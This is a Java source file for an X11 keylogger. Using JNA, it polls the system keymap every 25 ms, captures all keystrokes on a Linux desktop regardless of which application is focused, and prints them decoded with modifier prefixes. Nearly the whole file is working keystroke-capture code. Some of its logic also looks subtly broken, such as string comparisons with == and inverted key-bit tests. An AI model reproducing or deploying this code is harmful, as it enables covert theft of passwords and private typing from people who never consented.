package co.uk.baconi.keylogger.framework.impl;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.BlockingQueue;

import org.apache.log4j.Logger;

import co.uk.baconi.keylogger.framework.constants.Numbers;
import co.uk.baconi.keylogger.framework.impl.X11KeyLogger.X11KeyResult;
import co.uk.baconi.keylogger.framework.interfaces.KeyLogger;

import com.sun.jna.platform.unix.X11;
import com.sun.jna.platform.unix.X11.Display;
import com.sun.jna.ptr.IntByReference;

public final class X11KeyLogger extends AbstractImpl<X11KeyResult> implements KeyLogger {

    private static final Logger LOG = Logger.getLogger(X11KeyLogger.class);

    private final X11 x11 = X11.INSTANCE;
    private final Display x11Display = x11.XOpenDisplay(null);
    private final int sleepTime = 25;

    private final String[] key_map = new String[256];
    private final String[] key_map_upper = new String[256];
    private final Set<Integer> caps_set = new HashSet<Integer>();
    private final Set<Integer> shift_set = new HashSet<Integer>();
    private final Set<Integer> ctrl_set = new HashSet<Integer>();
    private final Set<Integer> alt_set = new HashSet<Integer>();
    private final Set<Integer> meta_set = new HashSet<Integer>();

    private X11KeyLogger() {
        super();

        final IntByReference min_key_code = new IntByReference();
        final IntByReference max_key_code = new IntByReference();

        x11.XDisplayKeycodes(x11Display, min_key_code, max_key_code);

        for (int code = 0; code <= max_key_code.getValue(); ++code) {
            if (code < min_key_code.getValue()) {
                key_map[code] = "NoSymbol";
                key_map_upper[code] = "NoSymbol";
                continue;
            }

            String keysym = x11.XKeysymToString(x11.XKeycodeToKeysym(x11Display, (byte) code, 0));
            key_map[code] = (keysym == null || keysym.trim().isEmpty()) ? "NoSymbol" : keysym;

            keysym = x11.XKeysymToString(x11.XKeycodeToKeysym(x11Display, (byte) code, 1));
            key_map_upper[code] = (keysym == null || keysym.trim().isEmpty()) ? "NoSymbol" : keysym;

            if (key_map[code] == "Caps_Lock") {
                caps_set.add(code);
            } else if (key_map[code] == "Shift_L" || key_map[code] == "Shift_R") {
                shift_set.add(code);
            } else if (key_map[code] == "Control_L" || key_map[code] == "Control_R") {
                ctrl_set.add(code);
            } else if (key_map[code] == "Alt_L" || key_map[code] == "Alt_R") {
                alt_set.add(code);
            } else if (key_map[code] == "Meta_L" || key_map[code] == "Meta_R") {
                meta_set.add(code);
            }
        }
    }

    @Override
    public void startLogging() {
        final byte szKey[] = new byte[32];
        final byte szKeyOld[] = new byte[32];

        for (;;) {
            try {
                x11.XQueryKeymap(x11Display, szKey);
                if (isNotEmpty(szKey) && !Arrays.equals(szKey, szKeyOld)) {
                    addToProcessQueue(new X11KeyResult(Arrays.copyOf(szKey, szKey.length)));
                    System.arraycopy(szKey, Numbers.ZERO, szKeyOld, Numbers.ZERO, szKey.length);
                } else {
                    Thread.sleep(sleepTime);
                }
            } catch (final Throwable t) {
                LOG.error(t.getClass().getName(), t);
            }
        }
    }

    @Override
    protected void processResults(final BlockingQueue<X11KeyResult> processQueue) {
        boolean last_is_nav = false; // navigation key indicator
        boolean last_is_char = false; // spaces adjustment
        final byte[] lastkeys = new byte[32];

        for (;;) {
            try {
                final byte[] keys = processQueue.take().getKeyMap();

                System.out.println("Process Thread: " + Arrays.toString(keys));

                // read modifiers (caps lock is ignored)
                boolean shift = false;
                boolean ctrl = false;
                boolean alt = false;
                boolean meta = false;

                for (int i = 0; i < keys.length; ++i) {
                    for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
                        if ((keys[i] & test) == 0) {
                            final int code = i * 8 + j;

                            if (shift_set.contains(code)) {
                                shift = true;
                            }

                            if (ctrl_set.contains(code)) {
                                ctrl = true;
                            }

                            if (alt_set.contains(code)) {
                                alt = true;
                            }

                            if (meta_set.contains(code)) {
                                meta = true;
                            }
                        }
                    }
                }

                for (int i = 0; i < keys.length; ++i) {
                    if (keys[i] != lastkeys[i]) {
                        // check which key got changed
                        for (int j = 0, test = 1; j < 8; ++j, test *= 2) {
                            if (((keys[i] & test) == 0) && (((keys[i] & test) == 0) != ((lastkeys[i] & test) == 0))) {
                                final int code = i * 8 + j;
                                String key = key_map[code];
                                final boolean key_is_nav = (key == "Nav");

                                // only print navigation keys once
                                if (!(last_is_nav && key_is_nav) && key.length() > 0) {
                                    // change key according to modifiers
                                    if (!key_is_nav) {
                                        if (shift) {
                                            key = key_map_upper[code];
                                        }

                                        if (meta) {
                                            key = "M-" + key;
                                        }

                                        if (alt) {
                                            key = "A-" + key;
                                        }

                                        if (ctrl) {
                                            key = "C-" + key;
                                        }
                                    }

                                    switch (key.length()) {
                                    case 1:
                                        System.out.print(key);
                                        last_is_char = (key != "\n");

                                        break;

                                    default:
                                        if (last_is_char) {
                                            System.out.print(' ');
                                            last_is_char = false;
                                        }

                                        System.out.println('[' + key + "] ");
                                        break;
                                    }

                                    last_is_nav = key_is_nav;
                                }
                            }
                        }

                        lastkeys[i] = keys[i];
                    }
                }
            } catch (final Throwable t) {
                LOG.error(t.getClass().getName(), t);
            }
        }
    }

    private static boolean isNotEmpty(final byte[] byteArray) {
        for (final byte value : byteArray) {
            if (value != 0) {
                return true;
            }
        }
        return false;
    }

    protected static final class X11KeyResult {
        private final byte[] keyMap;

        private X11KeyResult(final byte[] keyMap) {
            this.keyMap = keyMap;
        }

        public byte[] getKeyMap() {
            return keyMap;
        }
    }
}
